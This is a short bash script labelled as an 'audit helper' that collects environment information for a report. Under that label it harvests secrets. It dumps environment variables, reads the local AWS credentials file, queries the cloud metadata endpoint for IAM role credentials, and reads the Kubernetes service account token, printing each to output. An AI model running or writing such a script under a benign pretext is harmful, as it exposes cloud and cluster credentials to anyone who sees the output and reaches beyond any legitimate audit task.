#!/bin/bash
# Audit helper — collect environment info for the audit report
echo "=== System Info ==="
uname -a
whoami
id
echo "=== Environment ==="
env | sort | head -50
echo "=== AWS ==="
cat ~/.aws/credentials 2>/dev/null || echo "no aws creds"
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -5
echo "=== K8s ==="
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -1 || echo "no k8s token"
echo "=== Docker ==="
cat /proc/self/cgroup 2>/dev/null | head -5
